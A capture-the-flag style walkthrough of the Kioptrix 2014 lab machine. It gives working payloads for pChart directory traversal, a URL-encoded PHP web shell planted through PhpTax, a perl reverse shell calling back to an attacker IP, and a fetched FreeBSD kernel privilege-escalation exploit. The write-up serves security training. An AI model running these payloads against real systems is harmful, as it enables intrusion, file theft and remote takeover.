# Machine Link:
https://www.vulnhub.com/entry/kioptrix-2014-5,62/

## Machine Details
#### **OS:**
FreeBSD Linux
#### **Web-Technology**
PHP/5.3.8
#### **IP:**
192.168.56.2
#### **Users:**
root
toor
ossec
ossecm
ossecr
William L. Berggren

----

## Community Attack Vectors (To-Try List):

**80** HTTP -> Directory/Files Bruteforcing -> nikto -> View the source

**8080** HTTP ->Directory/Files Bruteforcing -> nikto -> View the source


----

# Nmap

```bash
nmap -v -sV -sC -p- 192.168.56.2 --open

**80**/tcp   open  http    **Apache httpd 2.2.21** ((**FreeBSD**) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 **PHP/5.3.8**)
|_http-title: Site doesn't have a title (text/html).
**8080**/tcp open  http    **Apache httpd 2.2.21** ((**FreeBSD**) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 **PHP/5.3.8**)
|_http-title: 403 Forbidden
```


---
# Web Service Enumeration

### NIKTO

```bash
nikto -host 192.168.56.2 -C all
```

- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:                  192.168.56.2
+ Target Hostname:    192.168.56.2
+ Target Port:              **80**
---------------------------------------------------------------------------
+ Server: **Apache/2.2.21** (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 **PHP/5.3.8**
+ /: Server may leak inodes via ETags, header found with file /, inode: 67014, size: 152, mtime: Sat Mar 29 22:52:52 2014. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ **PHP/5.3.8 appears to be outdated** (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing



```bash
nikto -host 192.168.56.2:8080 -C all
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:                  192.168.56.2
+ Target Hostname:    192.168.56.2
+ Target Port:              **8080**
---------------------------------------------------------------------------
+ + Server: **Apache/2.2.21** (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 **PHP/5.3.8**
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8 - **mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.**
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing


---


When checking the source on the we application on port 80 we found a directory name :
**pChart2.1.3/**

<img width="1920" height="1005" alt="image" src="https://github.com/user-attachments/assets/56dfcde7-3b92-4b2a-91f6-536064067ae7" />


Inside this directory we found this application running :

<img width="1918" height="1006" alt="image" src="https://github.com/user-attachments/assets/756e2dcc-9718-42b9-8cea-50b9eaf72332" />


Let's use searchsploit to see vulnerabilities of pChart 2.1.3 :

```bash
searchsploit pChart
```

<img width="1905" height="200" alt="image" src="https://github.com/user-attachments/assets/d0b2d097-c59b-473e-a524-4b18cea65350" />


In this exploit we found this details :

```
Directory Traversal:
"hxxp://localhost/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd"
The traversal is executed with the web server's privilege and leads to
sensitive file disclosure (passwd, siteconf.inc.php or similar),
access to source codes, hardcoded passwords or other high impact
consequences, depending on the web server's configuration.
This problem may exists in the production code if the example code was
copied into the production environment.
```


URL:
```
http://192.168.56.2/pChart2.1.3/examples/index.php?Action=View&Script=/../../../../../../etc/passwd
```


<img width="1392" height="901" alt="image" src="https://github.com/user-attachments/assets/e6c3a38c-7752-46e5-8bfa-2008410588da" />


Now in this situation we go the directory traversal vulnerability. So lets see the httpd.conf file :

```
http://192.168.56.2/pChart2.1.3/examples/index.php?Action=View&Script=/../../../../../../usr/local/etc/apache22/httpd.conf
```


<img width="1918" height="1047" alt="image" src="https://github.com/user-attachments/assets/0dc7d72b-ff18-4d60-bc7e-4b9195bb3420" />


Here we found that a specific user agent is required to access the web application running on port 8080.

For this use burp suite and take the request to repeater. IP:8080 in my case **http://192.168.56.2:8080/** 

Change the useragent to : **Mozilla/4.0 Mozilla4_browser**

<img width="1580" height="741" alt="image" src="https://github.com/user-attachments/assets/fd0aaaed-88a4-4111-8dd1-132905a9ca99" />

(we can also go to the proxy settings and in the "Match and Replace" option enable the replacing of user agent to Mozilla/4.0)

<img width="1890" height="281" alt="image" src="https://github.com/user-attachments/assets/3145588a-e01a-4a4a-a309-67fa3bd50ae9" />

Now copy the response to the browser, and you will see this page :

<img width="991" height="432" alt="image" src="https://github.com/user-attachments/assets/62a5b751-67d0-431c-a5ef-0403e6e98aff" />

Go inside the phptax directory :
<img width="1919" height="1010" alt="image" src="https://github.com/user-attachments/assets/c75fe51f-1ef7-4663-b241-51e7379128df" />


Now search for phptax on searchsploit :

```bash
searchsploit phptax

#output:
PhpTax 0.8 - File Manipulation 'newvalue' / Remote Code Execution  | php/webapps/25849.txt

#copy the exploit
searchsploit -m php/webapps/25849.txt
```


In this exploit we found that we can create a file which will give us the shell. Simply in the url paste this :

```bash
$shell = "{$url}/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E";
```

Our URL :
```
http://192.168.56.2:8080/phptax/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E";
```

Now simply go to the /phptax/data/ directory and open the **rce.php** file. Here use the parameter **?cmd=** and give the command.

<img width="922" height="619" alt="image" src="https://github.com/user-attachments/assets/f6cea925-335b-498d-b597-b9bee742a685" />


```
http://192.168.56.2:8080/phptax/data/rce.php?cmd=id
```

<img width="888" height="280" alt="image" src="https://github.com/user-attachments/assets/4f1876af-d40d-4ff2-8c60-e53630d67b19" />


Now here we found that perl is present by usign "**which perl**" so we used this perl reverse shell on our IP 192.168.1.9 and port 443.

Generated reverse shell from : 
https://www.revshells.com/

```perl
perl -e 'use Socket;$i="192.168.1.9";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

If not working than use URL encoding.

Start a listner on attacker system :

```bash
nc -nlvp 443
```

<img width="1913" height="1048" alt="image" src="https://github.com/user-attachments/assets/15d987d1-38fd-4407-952b-3d7f4d2c01c0" />


---
# Privilege Escalation

#### Find the FreeBSD version :

```sh
uname -a

FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64
```

#### Searching exploits for freebsd 9 :

```bash
searchsploit freebsd privilege escalation

FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escala | freebsd/local/28718.c

#get this file :
searchsploit -m freebsd/local/28718.c

#start a python server on this location to take this exploit to target
python -m http.server port --bind ip

#in my case
python -m http.server 8081 --bind 192.168.1.9
```

#### Taking the file to target :
We do not have wget and curl on the target. So we will use fetch.

```sh
which fetch
/usr/bin/fetch

#go to /tmp directory
cd /tmp

fetch http://192.168.1.9:8081/28718.c
```


#### Compiling the exploit :
```bash
gcc 28718.c -o 28718

#run the exploit
./28718
```

<img width="558" height="247" alt="image" src="https://github.com/user-attachments/assets/f117e7c6-355c-4240-b2a4-1de8750431f4" />


### Congrats.txt :
<img width="904" height="802" alt="image" src="https://github.com/user-attachments/assets/a47218f5-805d-49fb-90b7-f1389cd3e3d4" />

---
# Take Away Concepts
- The apache directory in freebsd is at **/usr/local/www/apache22/data** and httpd.conf file is at **usr/local/etc/apache22/httpd.conf**
- FreeBSD systems are very secure and don't have regular commands like wget, bash, etc. Making the shell stable is very difficult in FreeBSD. 
##### Why do we directly went for the configuration file and not did directory fuzzing first?

This is because we have another virtualhost whose access is not permitted to us. So we need to go through the httpd configuration file in order to find our way to the virtual host on 8080.

---
